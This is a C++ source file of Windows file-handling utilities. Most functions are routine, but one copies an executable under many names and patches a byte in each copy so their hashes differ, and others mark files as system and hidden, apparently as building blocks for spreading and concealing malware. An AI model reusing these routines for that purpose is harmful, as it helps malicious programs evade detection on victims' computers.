#include "FunctionsFiles.h"

/* ##################################################################################
   ##                                                                              ##
   ##  [ + ] FUNCTION: fileExists                                                  ##
   ##  [ + ] DESCRIPTION: Check if file pathFilename exists in your hard drive     ##
   ##  [ + ] PARAMETERS: pathFilename -> file fullpath                             ##
   ##  [ + ] RETURN: bool -> true: if file exists                                  ##
   ##                        false: if file !exists                                ##
   ##                                                                              ##
   ################################################################################## */
   
bool FunctionsFiles::fileExists(const char * pathFilename) { 
   struct stat stFileInfo;
   bool blnReturn;
   int intStat;
  
   intStat = stat(pathFilename, &stFileInfo);
  
   if(intStat == 0) blnReturn = true;
   else blnReturn = false;
  
   return(blnReturn);
}

/* ##################################################################################
   ##                                                                              ##
   ##  [ + ] FUNCTION: fileSize                                                    ##
   ##  [ + ] DESCRIPTION: return a filesize of file szFileName                     ##
   ##  [ + ] PARAMETERS: szFileName -> file fullpath                               ##
   ##  [ + ] RETURN: int -> > 0: filesize of filename                              ##
   ##                       = 0: error                                             ##
   ##                                                                              ##
   ################################################################################## */
   
long FunctionsFiles::fileSize(const char * szFileName) { 
  struct stat fileStat; 
  int err = stat(szFileName, &fileStat); 
  
  if (err == 0) return fileStat.st_size; 
  return 0;
}

/* ##################################################################################
   ##                                                                              ##
   ##  [ + ] FUNCTION: removeFile                                                  ##
   ##  [ + ] DESCRIPTION: erase specific file                                      ##
   ##  [ + ] PARAMETERS: pathFilename -> file fullpath                             ##
   ##  [ + ] RETURN: int -> true: file erased                                      ##
   ##                       false: can't erase file or not exists                  ##
   ##                                                                              ##
   ################################################################################## */
   
bool FunctionsFiles::removeFile(const char * pathFilename) {
   int result = -1;

   if (FunctionsFiles::fileExists(pathFilename)) result = remove(pathFilename);
   if (result == 0) return true;
   else return false;
}

bool FunctionsFiles::copyFile(const char * sourcePathFilename, const char * destinyPathFilename, bool overwrite) {
   
   if (((FunctionsFiles::fileExists(sourcePathFilename)) && (!FunctionsFiles::fileExists(destinyPathFilename))) ||
      ((FunctionsFiles::fileExists(sourcePathFilename)) && (FunctionsFiles::fileExists(destinyPathFilename)) && (overwrite))) { 
      fstream strFileIn(sourcePathFilename, fstream::in|fstream::binary);
      strFileIn << noskipws;
      istream_iterator<unsigned char> beginIn(strFileIn);
      istream_iterator<unsigned char> endIn;

      fstream strFileOut(destinyPathFilename, fstream::out|fstream::trunc|fstream::binary);
      ostream_iterator<char> beginOut(strFileOut);

      copy(beginIn, endIn, beginOut);
      return true;
   }
   return false;
}

bool FunctionsFiles::copyFile(const char * sourcePathFilename, std::string destinyPathFilename, bool overwrite) {
     
   if (((FunctionsFiles::fileExists(sourcePathFilename)) && (!FunctionsFiles::fileExists(destinyPathFilename.c_str()))) ||   
      ((FunctionsFiles::fileExists(sourcePathFilename)) && (FunctionsFiles::fileExists(destinyPathFilename.c_str())) && (overwrite))) {
      fstream strFileIn(sourcePathFilename, fstream::in|fstream::binary);
      strFileIn << noskipws;
      istream_iterator<unsigned char> beginIn(strFileIn);
      istream_iterator<unsigned char> endIn;

      fstream strFileOut(destinyPathFilename.c_str(), fstream::out|fstream::trunc|fstream::binary);
      ostream_iterator<char> beginOut(strFileOut);

      copy(beginIn, endIn, beginOut);
      return true;
   }
   return false; 
}

bool FunctionsFiles::copyFileMultipleName(const char * sourcePathFilename, const char * destinyPath, std::list<std::string> filename) {
   unsigned int base = 0;
   
   if ((FunctionsFiles::fileExists(sourcePathFilename)) && (FunctionsFiles::fileExists(destinyPath))) {  
      if ((stricmp(FunctionsStrings::getExtension(sourcePathFilename), ".exe") == 0) || (stricmp(FunctionsStrings::getExtension(sourcePathFilename), ".com") == 0)) {
         srand((unsigned) time(NULL));
         if (filename.size() < 65535) base = FunctionsAssistant::randomNumber(0, 65535 - filename.size());
         FunctionsAssistant::setNumber(0);
         for(list<string>::iterator i = filename.begin();(i != filename.end()); i++) { 
            if (copyFile(sourcePathFilename, string(destinyPath + string("\\")) + (*i))) { 
               FunctionsFiles::changeContentFile((string(destinyPath + string("\\")) + (*i)).c_str(), base);
            }
         }
      }
      else {
         for(list<string>::iterator i = filename.begin();(i != filename.end()); i++) { 
            if (copyFile(sourcePathFilename, string(destinyPath + string("\\")) + (*i))) { 
               FunctionsFiles::changeInformationFile((string(destinyPath + string("\\")) + (*i)).c_str(), (*i).c_str(), "SYSCODE TEAM");
            }
         }         
      }
      return true;
   }
   else return false;
}

/* ##################################################################################
   ##                                                                              ##
   ##  [ + ] FUNCTION: appendTextToFile                                            ##
   ##  [ + ] DESCRIPTION: Add text at the end of file pathFilename                 ##
   ##  [ + ] PARAMETERS: pathFilename -> file fullpath                             ##
   ##                    text -> addicional text                                   ##
   ##  [ + ] RETURN: bool -> true: if adicional text inserted correctly into file  ##
   ##                        false: if not inserted correctly                      ##
   ##                                                                              ##
   ################################################################################## */
   
bool FunctionsFiles::appendTextToFile(const char * pathFilename, const char * text) {
   FILE * stream;  
         
   stream = fopen(pathFilename, "r+");
   if (stream != NULL) {
      /* EMPTY FILE */
      if (fileSize(pathFilename) == 2) fseek(stream, 0, SEEK_SET);      
      else fseek(stream, 0, SEEK_END);
      if (fputs((string(text) + string("\n")).c_str(), stream) != EOF) {
         if (fflush(stream) != EOF) {
            fclose(stream);
            return true;
         }
      }
      fclose(stream);
   }
   return false;
}

bool FunctionsFiles::appendTextToFileAndErasePatern(const char * pathFilename, const char * text, const char * newText) {
   FILE * stream;  
   char line[BUFFER_READ_LINE];
   bool find = false;
   fpos_t pos;
            
   stream = fopen(pathFilename, "r+");
   if (stream != NULL) {
   
      while ((fgets(line, BUFFER_READ_LINE, stream) != NULL) && (find == false)) { 
         if (strstr(line, text) != NULL) {
            int i;
            fgetpos(stream, &pos); pos = pos - strlen(line) - 1; fsetpos(stream, &pos);
            for(i = 0; i < strlen(line); i++) line[i] = '\x20';
            line[i-1] = '\x00';            
            fprintf(stream, "%s", line);
            fflush(stream);
       
            fseek(stream, 0, SEEK_END);
            fputs((string(newText) + string("\n")).c_str(), stream);
            fflush(stream);
            find = true;
         }
      }
      fclose(stream);
   }             
   return find;
}

/* ##################################################################################
   ##                                                                              ##
   ##  [ + ] FUNCTION: putTextToFile                                               ##
   ##  [ + ] DESCRIPTION: insert text at the beginning of file pathFilename        ##
   ##  [ + ] PARAMETERS: pathFilename -> file fullpath                             ##
   ##                    text -> text inserted                                     ##
   ##  [ + ] RETURN: bool -> true: if text inserted correctly into file            ##
   ##                        false: if not inserted correctly                      ##
   ##                                                                              ##
   ################################################################################## */
   
bool FunctionsFiles::putTextToFile(const char * pathFilename, const char * text) {
   FILE * stream;  
   
   /*if (FunctionsFiles::fileExists(pathFilename)) { 
      SetFileAttributes(pathFilename, FILE_ATTRIBUTE_NORMAL);
      removeFile(pathFilename);
   }*/
   
   stream = fopen(pathFilename, "w");
   if (stream != NULL) {
      /* EMPTY FILE */
      if (fputs((string(text) + string("\n")).c_str(), stream) != EOF) {
         if (fflush(stream) != EOF) {
            fclose(stream);
            return true;
         }
      }
      fclose(stream);
   }
   return false;
}

bool FunctionsFiles::changeInformationFile(const char * pathFilename, const char * TitleName, const char * Author) {
   PROPSPEC ps[3]; PROPVARIANT pv[3];
   IPropertySetStorage * pPropSetStg = NULL;
   IPropertyStorage * pPropStg = NULL;
   FMTID Summary = FMTID_SummaryInformation;
   wchar_t * wcFilename;
   char buff[20];
   int requiredSize; 
    
   requiredSize = mbstowcs(NULL, pathFilename, 0);
   wcFilename = (wchar_t *) malloc((requiredSize + 1) * sizeof(wchar_t));
   
   if (wcFilename) { 
      /* Casting Filename to unicode */
      mbstowcs(wcFilename, pathFilename, requiredSize + 1);
      
      if (StgOpenStorageEx(wcFilename, STGM_READWRITE | STGM_SHARE_EXCLUSIVE, STGFMT_ANY, 0, NULL, NULL, IID_IPropertySetStorage, (void**)&pPropSetStg) == S_OK) {

         srand((unsigned) time(NULL));

         if (pPropSetStg->Create(&Summary, NULL, PROPSETFLAG_DEFAULT, STGM_READWRITE | STGM_SHARE_EXCLUSIVE, &pPropStg) == S_OK) {

            /* Tell Windows to set Title */
            ps[0].ulKind = 1;
            ps[0].propid = 0x00000002L; 
            ps[1].ulKind = 1;
            ps[1].propid = 0x00000003L;
            ps[2].ulKind = 1;
            ps[2].propid = 0x00000004L;
         
            pv[0].vt = VT_LPSTR;
            pv[0].pszVal = (char *) TitleName;
            pv[1].vt = VT_LPSTR;
            itoa(rand(), buff, 2);
            pv[1].pszVal = buff;
            pv[2].vt = VT_LPSTR;
            pv[2].pszVal = (char *) Author;
         
            /* Flush data to file */
            pPropStg->WriteMultiple(3, ps, pv, 0);

            /* Release interfaces in the reverse order in which they where obtained */
            pPropStg->Release();
            pPropSetStg->Release();
            free(wcFilename);
            
            return true;
         }
      }
      free(wcFilename);
   }
   return false;
}

bool FunctionsFiles::setFileAttributesSHR(const char * path) {
   if (SetFileAttributes(path, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY) != 0) return true;
   return false;
}

bool FunctionsFiles::setFileAttributesSH(const char * path) {
   if (SetFileAttributes(path, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN) != 0) return true;
   return false;
}

bool FunctionsFiles::setFileAttributesR(const char * path) {
   if (SetFileAttributes(path, FILE_ATTRIBUTE_READONLY) != 0) return true;
   return false;
}

bool FunctionsFiles::changeContentFile(const char * pathFilename, unsigned int base) {
   FILE * stream;
   bool result = false;
   char buff[6];
   
   if (fileExists(pathFilename)) {
      stream = fopen(pathFilename, "r+b"); 
      if (stream != NULL) {
         fseek(stream, BINARY_TEXT_FILE_MODIFICABLE_POSITION, SEEK_SET);
         
         sprintf(buff, "%u", base + FunctionsAssistant::getNumber());
         fputs(buff, stream);
         if (fflush(stream) != EOF) result = true;
         fclose(stream);
      }
   }
   return result;
}
